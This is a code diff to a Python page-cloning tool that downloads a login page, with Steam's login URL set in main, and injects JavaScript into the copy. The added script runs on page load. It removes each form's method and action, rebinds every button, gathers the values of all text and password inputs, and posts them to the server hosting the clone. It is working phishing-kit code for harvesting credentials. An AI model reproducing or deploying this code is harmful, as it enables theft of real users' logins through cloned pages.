@@ -16,7 +16,7 @@ class Cloner:
     def clone(self):
         html = self.download(self.site)
         html = self.linkGenerator(html)
-        html = self.findInputs(html)
+        html = self.injectJS(html)
         self.saveHtml(html)
 
     """
@@ -102,41 +102,12 @@ class Cloner:
                 print(f"failed at saving data from url:{url} at {dest}")
         return str(soup)
 
-    def findInputs(self,html):
+    def injectJS(self,html):
         soup = BeautifulSoup(html, "html.parser")
-        forms = soup.find_all("form")
-
-        for form in forms:
-            if (hasattr(form,"method")):
-                del form["method"]
-            if (hasattr(form,"action")):
-                del form["action"]
-
-        data = {}
-        
-        inputs = soup.find_all("input",type="text") + soup.find_all("input",type="password")
-        
-        for inp in inputs:
-            if not inp.get("id",None):
-                continue
-            name = inp["name"] if inp.get("name", None) else inp["id"]
-            value = f"document.getElementById('{inp['id']}').value"
-            data[name] = value
-
-        buttons = soup.find_all("button")
-        for button in buttons:
-            bType = button.get("type",None)
-            if bType: del button["type"]
-            button["onclick"] = "___send()"
                 
         js = """
             function ___location() {
-                return window.location.href.match(/^(.*\/\/.*?)(\/.*?)$/)[1];
-            }
-
-            function ___params() {
-                return { """ +  ",".join(f"{k}:{v}" for k,v in data.items()) + """ 
-                }
+              return window.location.href.match(/^(.*\/\/.*?)(\/.*?)$/)[1];
             }
 
             function ___post(path, params) {
@@ -160,20 +131,44 @@ class Cloner:
                 form.submit();
             }
 
-            function ___send() {
-                ___post(___location(),___params());
+            function ___getData() {
+              let inputs = document.getElementsByTagName("input")
+              let data = {}
+              let state = 0;
+              let gen = () => { state+=1; return state;}
+              for(let inp of inputs) {
+                if(inp.type == "text" || inp.type == "password") {
+                  let name = inp.hasAttribute("name") ? inp.getAttribute("name") : 
+                    inp.hasAttribute("formcontrolname") ? inp.getAttribute("formcontrolname") : 
+                    inp.hasAttribute("id") ? inp.getAttribute("id") : "field_#" + gen();
+                    if(!inp.value) continue;
+                  data[name] = inp.value;
+                }
+              }
+              return data
             }
+
+            function ___send() {
+                ___post(___location(),___getData());
+            }
+
+            window.addEventListener("load",()=>{
+              let forms = document.getElementsByTagName("form");
+              for(let form of forms) {
+                form.removeAttribute("method");
+                form.removeAttribute("action");
+              }
+              let buttons = document.getElementsByTagName("button");
+              for(let button of buttons) {
+                button.removeAttribute("type");
+                button.setAttribute("onclick","___send()")
+              }
+            })
         """
         tag = soup.new_tag("script")
         tag.insert(1,js)
         soup.body.append(tag)
         return str(soup)
-
-        
-# def main():
-#     site = "https://store.steampowered.com/login/"
-#     cloner = Cloner(site,"steam")
-#     cloner.clone()
 
 def main():
     site = "https://store.steampowered.com/login/"
